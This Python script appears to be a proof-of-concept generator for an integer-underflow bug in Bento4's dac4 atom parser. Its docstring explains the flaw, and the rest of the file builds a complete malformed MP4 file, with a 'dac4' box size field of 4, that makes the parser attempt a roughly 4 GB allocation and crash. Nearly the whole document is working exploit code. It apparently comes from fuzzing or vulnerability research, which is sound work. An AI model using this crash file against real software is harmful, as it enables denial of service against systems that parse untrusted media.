#!/usr/bin/env python3
"""
PoC generator for VULN 002: Integer Underflow in AP4_Dac4Atom::Create
CWE-191: Integer Underflow (Wraparound)

File:  Bento4/Source/C++/Core/Ap4Dac4Atom.cpp, lines 49-51
Bug:
    unsigned int payload_size = size - AP4_ATOM_HEADER_SIZE;  // line 49
    AP4_DataBuffer payload_data(payload_size);                  // line 50

When the 'dac4' box size field is < 8 (AP4_ATOM_HEADER_SIZE), unsigned subtraction
wraps around:  4 - 8 = 0xFFFFFFF8 (~4 GB).
AP4_DataBuffer(0xFFFFFFF8) tries to allocate ~4 GB, causing std::bad_alloc / OOM crash.

Trigger: craft an MP4 with a dac4 box whose 4-byte size field is 4 (less than 8).
The box type bytes 'dac4' are still present in the file so the parser can recognise
the box type before calling Create(4, stream).
"""

import struct
import os

OUTPUT_DIR = "/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Dac4Atom_cpp"
OUTPUT_FILE = os.path.join(OUTPUT_DIR, "vuln_002.mp4")


# ---------------------------------------------------------------------------
# Box helpers
# ---------------------------------------------------------------------------

def box(box_type: bytes, payload: bytes) -> bytes:
    """Standard ISO BMFF box: 4-byte big-endian size + 4-byte type + payload."""
    assert len(box_type) == 4
    size = 8 + len(payload)
    return struct.pack(">I4s", size, box_type) + payload


def fullbox(box_type: bytes, version: int, flags: int, payload: bytes) -> bytes:
    """FullBox: box with 1-byte version + 3-byte flags prepended."""
    vf = struct.pack(">B", version) + struct.pack(">I", flags & 0x00FFFFFF)[1:]
    return box(box_type, vf + payload)


# ---------------------------------------------------------------------------
# Identity matrix (3x3, 9 x int32, big-endian)
# ---------------------------------------------------------------------------
IDENTITY_MATRIX = struct.pack(
    ">9i",
    0x00010000, 0, 0,
    0, 0x00010000, 0,
    0, 0, 0x40000000,
)

# ---------------------------------------------------------------------------
# The malformed dac4 box
# *** size field = 4 (< AP4_ATOM_HEADER_SIZE=8) ***
# Physically 8 bytes in the file (4 bytes size + 4 bytes type "dac4").
# The parser reads size=4 then type="dac4", then calls Create(4, stream).
# Inside Create(): payload_size = 4 - 8 = 0xFFFFFFF8 (underflow) -> ~4 GB alloc.
# ---------------------------------------------------------------------------
dac4_box = struct.pack(">I4s", 4, b"dac4")   # size=4, type="dac4"

# ---------------------------------------------------------------------------
# mp4a AudioSampleEntry  (ISO 14496-12 §12.2.3)
#   SampleEntry:       6-byte reserved + 2-byte data_reference_index
#   AudioSampleEntry:  8-byte reserved + channelcount(2) + samplesize(2)
#                      + pre_defined(2) + reserved(2) + samplerate(4)
#   Children:          dac4_box (the malformed one)
# ---------------------------------------------------------------------------
audio_entry_fields = (
    b"\x00" * 6                     +  # reserved
    struct.pack(">H", 1)            +  # data_reference_index
    b"\x00" * 8                     +  # reserved [2]
    struct.pack(">H", 2)            +  # channelcount
    struct.pack(">H", 16)           +  # samplesize
    struct.pack(">H", 0)            +  # pre_defined
    struct.pack(">H", 0)            +  # reserved
    struct.pack(">I", 44100 << 16)     # samplerate (16.16 fixed-point)
)
mp4a_box = box(b"mp4a", audio_entry_fields + dac4_box)

# ---------------------------------------------------------------------------
# stsd (sample description box) — FullBox
# ---------------------------------------------------------------------------
stsd_box = fullbox(
    b"stsd", 0, 0,
    struct.pack(">I", 1) + mp4a_box  # entry_count=1, then the mp4a entry
)

# Empty sample table boxes
stts_box = fullbox(b"stts", 0, 0, struct.pack(">I", 0))   # entry_count=0
stsc_box = fullbox(b"stsc", 0, 0, struct.pack(">I", 0))   # entry_count=0
stsz_box = fullbox(b"stsz", 0, 0, struct.pack(">II", 0, 0))  # sample_size=0, sample_count=0
stco_box = fullbox(b"stco", 0, 0, struct.pack(">I", 0))   # entry_count=0

stbl_box = box(b"stbl", stsd_box + stts_box + stsc_box + stsz_box + stco_box)

# ---------------------------------------------------------------------------
# Media information box
# ---------------------------------------------------------------------------
smhd_box = fullbox(b"smhd", 0, 0, struct.pack(">HH", 0, 0))   # balance=0, reserved=0

url_box  = fullbox(b"url ", 0, 1, b"")                          # flags=1 = self-contained
dref_box = fullbox(b"dref", 0, 0, struct.pack(">I", 1) + url_box)
dinf_box = box(b"dinf", dref_box)

minf_box = box(b"minf", smhd_box + dinf_box + stbl_box)

# ---------------------------------------------------------------------------
# Media box
# ---------------------------------------------------------------------------
mdhd_box = fullbox(
    b"mdhd", 0, 0,
    struct.pack(">IIII", 0, 0, 44100, 0) +   # ctime, mtime, timescale, duration
    struct.pack(">HH", 0, 0)                  # language, pre_defined
)

hdlr_box = fullbox(
    b"hdlr", 0, 0,
    struct.pack(">I", 0)  +   # pre_defined
    b"soun"               +   # handler_type
    b"\x00" * 12         +   # reserved
    b"\x00"                   # null-terminated name
)

mdia_box = box(b"mdia", mdhd_box + hdlr_box + minf_box)

# ---------------------------------------------------------------------------
# Track box
# ---------------------------------------------------------------------------
tkhd_box = fullbox(
    b"tkhd", 0, 3,            # flags=3: track enabled + in movie
    struct.pack(">IIIII", 0, 0, 1, 0, 0) +   # ctime, mtime, track_id, reserved, duration
    b"\x00" * 8              +               # reserved
    struct.pack(">HH", 0, 0) +              # layer, alternate_group
    struct.pack(">H", 0x0100)+              # volume (1.0 for audio)
    struct.pack(">H", 0)     +              # reserved
    IDENTITY_MATRIX          +
    struct.pack(">II", 0, 0)               # width, height
)

trak_box = box(b"trak", tkhd_box + mdia_box)

# ---------------------------------------------------------------------------
# Movie box
# ---------------------------------------------------------------------------
mvhd_box = fullbox(
    b"mvhd", 0, 0,
    struct.pack(">IIII", 0, 0, 1000, 0) +   # ctime, mtime, timescale, duration
    struct.pack(">I", 0x00010000)        +   # rate (1.0)
    struct.pack(">H", 0x0100)           +   # volume (1.0)
    b"\x00" * 10                        +   # reserved (2 + 8)
    IDENTITY_MATRIX                     +
    b"\x00" * 24                        +   # pre_defined[6]
    struct.pack(">I", 2)                    # next_track_ID
)

moov_box = box(b"moov", mvhd_box + trak_box)

# ---------------------------------------------------------------------------
# File type box
# ---------------------------------------------------------------------------
ftyp_box = box(b"ftyp", b"mp42" + struct.pack(">I", 0) + b"mp42" + b"isom")

# ---------------------------------------------------------------------------
# Assemble and write
# ---------------------------------------------------------------------------
mp4_data = ftyp_box + moov_box

os.makedirs(OUTPUT_DIR, exist_ok=True)
with open(OUTPUT_FILE, "wb") as f:
    f.write(mp4_data)

print(f"[+] Written {OUTPUT_FILE} ({len(mp4_data)} bytes)")
print(f"[+] dac4 box: size field = 4 (triggers underflow: 4 - 8 = 0xFFFFFFF8)")
print(f"[+] AP4_DataBuffer(0xFFFFFFF8) will attempt to allocate ~4 GB")
